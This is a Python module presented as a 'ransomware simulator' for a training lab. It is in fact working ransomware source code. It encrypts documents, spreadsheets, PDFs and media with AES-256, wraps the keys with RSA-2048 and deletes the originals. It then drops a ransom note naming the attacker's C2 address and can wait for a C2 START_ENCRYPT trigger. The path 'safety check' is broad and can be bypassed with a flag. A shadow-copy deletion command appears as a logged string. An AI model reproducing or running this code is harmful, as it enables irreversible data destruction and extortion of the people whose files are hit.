"""ransomware/simulator.py — Ransomware Simulator Module (Module 3A).

Executes controlled, safety-checked encryption on target test directories.
Features:
  - Startup safety path verification
  - Alphabetical directory and file traversal (os.walk topdown=True, sorted)
  - Selective extension targeting (.docx, .xlsx, .pdf, .jpg, .mp3, .mp4)
  - Hybrid AES-256 + RSA-2048 encryption (.locked and .key sidecars)
  - Drops README_DECRYPT.txt in touched directories
  - Strict JSON-lines logging to logs/simulator.log
  - Simulated shadow-copy deletion command logged
  - Graceful exit / summary logging on completion or SIGTERM / SIGINT
  - Supports --standalone and --listen-c2 execution modes
"""

import argparse
from datetime import datetime, timezone
import json
import os
import signal
import socket
import sys
import time

# Ensure project root is in sys.path
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

import config
from shared.crypto import (
    aes_encrypt,
    generate_aes_key,
    generate_iv,
    rsa_wrap_key
)

TARGET_EXTENSIONS = {".docx", ".xlsx", ".pdf", ".jpg", ".mp3", ".mp4"}

# Global state for stats and signal handler
stats = {
    "files_encrypted": 0,
    "total_bytes": 0,
    "start_time": None,
    "stopped_by_signal": False
}

log_file_path = None


def get_iso_timestamp() -> str:
    """Return ISO 8601 UTC timestamp with millisecond precision."""
    now = datetime.now(timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def write_log(event_type: str, details: dict = None):
    """Write structured JSON-lines log entry to logs/simulator.log."""
    global log_file_path
    if log_file_path is None:
        log_dir = getattr(config, "LOG_DIR", os.path.join(PROJECT_ROOT, "logs"))
        # Allow local path fallback if configured directory cannot be created (e.g. /home/victim on Windows)
        try:
            os.makedirs(log_dir, exist_ok=True)
        except OSError:
            log_dir = os.path.join(PROJECT_ROOT, "logs")
            os.makedirs(log_dir, exist_ok=True)
        log_file_path = os.path.join(log_dir, "simulator.log")

    payload = {
        "ts": get_iso_timestamp(),
        "module": "simulator",
        "event": event_type,
        "pid": os.getpid()
    }
    if details:
        payload.update(details)

    try:
        with open(log_file_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(payload) + "\n")
            f.flush()
    except Exception as e:
        print(f"[!] Failed to write log: {e}", file=sys.stderr)


def validate_target_directory(data_dir: str, allow_local_override: bool = False):
    """Safety check: ensures test data dir exists and matches safe prefixes."""
    abs_path = os.path.abspath(data_dir)

    if not os.path.exists(abs_path):
        raise FileNotFoundError(f"Safety Check Failed: Target directory does not exist: {abs_path}")

    # Explicit safe prefixes to prevent accidental damage to host OS
    safe_prefixes = [
        "/home/victim/MILITARY_DATA",
        "/home/victim",
        os.path.abspath(PROJECT_ROOT)
    ]

    # If running in temp or custom dev folder, check if it explicitly matches
    is_safe = any(abs_path.startswith(os.path.abspath(prefix)) for prefix in safe_prefixes)
    if not is_safe and not allow_local_override:
        raise PermissionError(
            f"Safety Check Refusal: Path '{abs_path}' does not start with an authorized safe prefix: {safe_prefixes}"
        )


def drop_ransom_note(dir_path: str):
    """Create README_DECRYPT.txt in the given directory."""
    note_path = os.path.join(dir_path, config.RANSOM_NOTE)
    note_content = (
        "================================================================================\n"
        "                    YOUR FILES HAVE BEEN ENCRYPTED!\n"
        "================================================================================\n"
        "All your operational documents, intelligence reports, and media have been\n"
        "encrypted using military-grade hybrid encryption: AES-256-CBC and RSA-2048.\n\n"
        "Your files now have the extension .locked, and each file's encrypted AES key\n"
        "is stored in a corresponding .key file. It is mathematically impossible to recover\n"
        "your data without our private RSA decryption key.\n\n"
        "To restore your systems:\n"
        f"1. Do not rename, modify, or attempt to decrypt {config.ENCRYPTED_EXT} files.\n"
        f"2. Contact the Command & Control server at {config.ATTACKER_IP}:{config.C2_PORT}.\n"
        "3. Submit your unique victim key identifier for verification.\n\n"
        "DO NOT ATTEMPT TO RECOVER FILES YOURSELF. ANY TAMPERING WILL RESULT IN PERMANENT\n"
        "DATA CORRUPTION.\n"
        "================================================================================\n"
    )
    try:
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(note_content)
    except Exception as e:
        print(f"[!] Warning: Failed to drop ransom note in {dir_path}: {e}", file=sys.stderr)


def encrypt_file(file_path: str, pub_key_path: str) -> bool:
    """Encrypt a single file with AES-256, wrap key with RSA-2048, and delete original."""
    try:
        with open(file_path, "rb") as f:
            plaintext = f.read()
        original_size = len(plaintext)

        # Generate fresh AES key and IV
        aes_key = generate_aes_key()
        iv = generate_iv()

        # Encrypt data
        ciphertext = aes_encrypt(plaintext, iv, aes_key)

        # Wrap AES key with attacker's RSA public key
        wrapped_key = rsa_wrap_key(aes_key, pub_key_path)

        # Write ciphertext with IV prepended (16 bytes IV + ciphertext)
        locked_path = file_path + config.ENCRYPTED_EXT
        with open(locked_path, "wb") as f:
            f.write(iv + ciphertext)

        # Write wrapped AES key
        key_path = file_path + config.KEY_EXT
        with open(key_path, "wb") as f:
            f.write(wrapped_key)

        # Securely remove original file
        os.remove(file_path)

        # Update stats
        stats["files_encrypted"] += 1
        stats["total_bytes"] += original_size

        # Log event
        write_log("file_encrypted", {
            "file": file_path.replace("\\", "/"),
            "size_bytes": original_size,
            "locked_file": locked_path.replace("\\", "/"),
            "key_file": key_path.replace("\\", "/")
        })
        return True
    except Exception as e:
        write_log("encryption_error", {
            "file": file_path.replace("\\", "/"),
            "error": str(e)
        })
        print(f"[!] Error encrypting {file_path}: {e}", file=sys.stderr)
        return False


def run_traversal(data_dir: str, pub_key_path: str):
    """Walk directories alphabetically, encrypting target files and dropping ransom notes."""
    stats["start_time"] = time.time()
    write_log("traversal_started", {
        "target_dir": data_dir.replace("\\", "/"),
        "pub_key": pub_key_path.replace("\\", "/")
    })

    # Log shadow copy deletion command (simulated)
    write_log("shadow_copy_simulated", {
        "command": "vssadmin delete shadows /all /quiet",
        "action": "logged_only_for_forensic_investigation"
    })

    for root, dirs, files in os.walk(data_dir, topdown=True):
        # Sort in-place for strict alphabetical traversal
        dirs.sort()
        files.sort()

        touched_directory = False

        for filename in files:
            ext = os.path.splitext(filename)[1].lower()
            if ext in TARGET_EXTENSIONS:
                full_path = os.path.join(root, filename)
                success = encrypt_file(full_path, pub_key_path)
                if success:
                    touched_directory = True

        if touched_directory:
            drop_ransom_note(root)

    duration = time.time() - stats["start_time"]
    write_log("traversal_complete", {
        "files_encrypted": stats["files_encrypted"],
        "total_bytes": stats["total_bytes"],
        "duration_seconds": round(duration, 4)
    })
    print(f"[+] Traversal finished: {stats['files_encrypted']} files encrypted, {stats['total_bytes']} bytes.")


def signal_handler(signum, frame):
    """Handle termination signals (SIGTERM, SIGINT) and log summary."""
    stats["stopped_by_signal"] = True
    sig_name = signal.Signals(signum).name if hasattr(signal, "Signals") else str(signum)
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    write_log("simulator_stopped", {
        "signal": sig_name,
        "files_encrypted": stats["files_encrypted"],
        "total_bytes": stats["total_bytes"],
        "duration_seconds": round(elapsed, 4)
    })
    print(f"\n[!] Caught {sig_name}. Containment detected. Simulator terminated safely.")
    sys.exit(0)


def listen_for_c2_trigger(trigger_port: int) -> bool:
    """Listen on socket for START_ENCRYPT command from C2."""
    print(f"[*] Waiting for C2 trigger on 0.0.0.0:{trigger_port}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", trigger_port))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Connected by C2 at {addr}")
    try:
        raw_msg = conn.recv(1024).decode("utf-8", errors="ignore").strip()
        print(f"[*] Received C2 signal: {raw_msg}")
        if "START_ENCRYPT" in raw_msg:
            conn.sendall(b"OK_STARTING\n")
            conn.close()
            server.close()
            return True
        else:
            conn.sendall(b"UNKNOWN_COMMAND\n")
            conn.close()
            server.close()
            return False
    except Exception as e:
        print(f"[!] Error receiving trigger: {e}", file=sys.stderr)
        server.close()
        return False


def main():
    parser = argparse.ArgumentParser(description="ISL Ransomware Simulator (Module 3A)")
    parser.add_argument("--data-dir", default=config.TEST_DATA_DIR, help="Target data directory")
    parser.add_argument("--pub-key", default=config.RSA_PUB_KEY_PATH, help="Path to RSA public key PEM")
    parser.add_argument("--standalone", action="store_true", help="Execute traversal immediately without waiting for C2")
    parser.add_argument("--listen-port", type=int, default=None, help="Port to wait for C2 START_ENCRYPT signal")
    parser.add_argument("--allow-local", action="store_true", help="Allow running on local dev directories")
    args = parser.parse_args()

    # Register signal handlers
    try:
        signal.signal(signal.SIGTERM, signal_handler)
    except (AttributeError, ValueError):
        pass  # Windows may not have all signals
    signal.signal(signal.SIGINT, signal_handler)

    target_dir = os.path.abspath(args.data_dir)
    pub_key_path = os.path.abspath(args.pub_key)

    # Validate target directory
    validate_target_directory(target_dir, allow_local_override=args.allow_local)

    # Verify RSA public key exists
    if not os.path.exists(pub_key_path):
        print(f"[!] Public key not found at {pub_key_path}. Generating temporary RSA keypair...", file=sys.stderr)
        from shared.crypto import generate_rsa_keypair
        priv_key_path = os.path.splitext(pub_key_path)[0] + "_private.pem"
        generate_rsa_keypair(pub_key_path, priv_key_path)
        print(f"[+] Created temporary keypair:\n    Public: {pub_key_path}\n    Private: {priv_key_path}")

    # Determine execution mode
    if args.listen_port:
        triggered = listen_for_c2_trigger(args.listen_port)
        if not triggered:
            print("[!] Trigger was not START_ENCRYPT. Exiting.")
            sys.exit(1)
    elif not args.standalone:
        # Default behavior: if no listen port and not standalone, check if C2 socket is specified
        print("[*] Running in standalone test mode (use --listen-port for C2 socket trigger)")

    # Execute encryption traversal
    run_traversal(target_dir, pub_key_path)


if __name__ == "__main__":
    main()
